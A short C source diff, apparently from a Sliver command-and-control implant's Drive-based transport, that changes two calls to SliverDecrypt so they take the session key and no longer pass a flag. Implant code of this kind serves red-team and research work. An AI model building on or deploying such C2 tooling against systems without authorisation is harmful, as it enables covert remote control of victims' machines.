@@ -176,7 +176,7 @@ BOOL DriveStart
 			continue;
 		}
 
-		pSessionId = SliverDecrypt(pConfig, pRespData, TRUE);
+		pSessionId = SliverDecrypt(pConfig->pSessionKey, pRespData);
 		memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
 		Result = TRUE;
 		break;
@@ -366,7 +366,7 @@ PENVELOPE DriveRecv
 		pRespData = BufferMove(pResp->pRespData, pResp->cbResp);
 		pResp->pRespData = NULL;
 		pDriveClient->dwRecvCounter++;
-		pPlainText = SliverDecrypt(pConfig->pSessionKey, pRespData, TRUE);
+		pPlainText = SliverDecrypt(pConfig->pSessionKey, pRespData);
 		pResult = UnmarshalEnvelope(pPlainText);
 
 		PrintFormatA("----------------------------------------------------\nReceive Envelope:\n");
